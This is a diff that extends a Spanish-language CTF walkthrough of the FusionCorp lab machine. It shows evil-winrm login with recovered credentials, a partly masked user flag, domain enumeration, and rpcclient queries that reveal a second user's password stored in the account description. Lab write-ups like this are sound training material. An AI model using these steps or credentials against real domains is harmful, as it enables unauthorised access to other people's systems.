@@ -178,7 +178,108 @@ Ya tenemos los puertos copiado en el Clipboard, un script simple pero de gran ay
 
       Conseguimos credenciales     lparker:!!abbylvzsvs2k6!
 
+
+## Autenticacion en la maquina victima
+
+-Nos autenticamos con el usuario lparker en la maquina victima y obtenemos --> flag.txt(User1)
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
+    └─# evil-winrm -i 10.10.169.83 -u lparker -p '!!abbylvzsvs2k6!'
     
+    *Evil-WinRM* PS C:\Users\lparker\Documents> dir ..\Desktop
+    
+        Directory: C:\Users\lparker\Desktop
+    Mode                LastWriteTime         Length Name
+    ----                -------------         ------ ----
+    -a----         3/3/2021   6:04 AM             37 flag.txt
+    
+    *Evil-WinRM* PS C:\Users\lparker\Documents> type ..\Desktop\flag.txt
+    THM{c105b6fb249741b8-------ada8218f4ef}
+
+-Despues de analizar la maquina y visualizar toda la info del usuario lparker,necesitamos escalar privilegios.
+
+    *Evil-WinRM* PS C:\Users\lparker\Documents> whoami /all
+    
+    USER INFORMATION
+    ----------------
+    User Name      SID
+    ============== =============================================
+    fusion\lparker S-1-5-21-1898838421-3672757654-990739655-1103
+    
+    GROUP INFORMATION
+    -----------------
+    Group Name                                  Type             SID          Attributes
+    =========================================== ================ ============ ==================================================
+    Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+    PRIVILEGES INFORMATION
+    ----------------------
+    Privilege Name                Description                    State
+    ============================= ============================== =======
+    SeMachineAccountPrivilege     Add workstations to domain     Enabled
+    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+-Mostramos los usuario del sistema.
+
+    *Evil-WinRM* PS C:\Users\lparker\Documents> net user
+    
+    User accounts for \\
+    -------------------------------------------------------------------------------
+    Administrator            Guest                    jmurphy
+    krbtgt                   lparker
+    The command completed with one or more errors.
+
+  
+
+## Escalada de privilegios lparker --> jmurphy
+
+-Este proceso de obtencion de credenciales para el usuario jmurphy se puede hacer mediante el servicio 389(ldap) o  135(msrpc) 
+
+1) MSRPC
+
+       INFO:
+         MSRPC son las siglas de "Microsoft Remote Procedure Call" (Llamada a Procedimiento Remoto de Microsoft).
+   
+         Permite que los programas en una computadora hagan llamadas a procedimientos ubicados en otras computadoras,
+         como si estuvieran llamando a funciones o métodos locales.
+   
+   INFO: rpcclient enumeration [+] https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-smb/rpcclient-enumeration
+
+   -Enumeramos usuario del sistema y obtenemos informacion del usuario jmurphy.
+   
+        ┌┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/FusionCorp]
+        └─# rpcclient fusion.corp -U "fusion.corp/lparker" --password='!!abbylvzsvs2k6!'       
+        rpcclient $> enumdomusers
+        user:[Administrator] rid:[0x1f4]
+        user:[Guest] rid:[0x1f5]
+        user:[krbtgt] rid:[0x1f6]
+        user:[lparker] rid:[0x44f]
+        user:[jmurphy] rid:[0x450]
+        rpcclient $> queryuser 0x450
+                User Name   :   jmurphy
+                Full Name   :   Joseph Murphy
+                Home Drive  :
+                Dir Drive   :
+                Profile Path:
+                Logon Script:
+                Description :   Password set to u8WC3!kLsgw=#bRY
+                Workstations:
+                Comment     :
+       [...]
+
+    Encontamos credenciales del usuario jmurphy:u8WC3!kLsgw=#bRY
+
+
+  
 
   
         
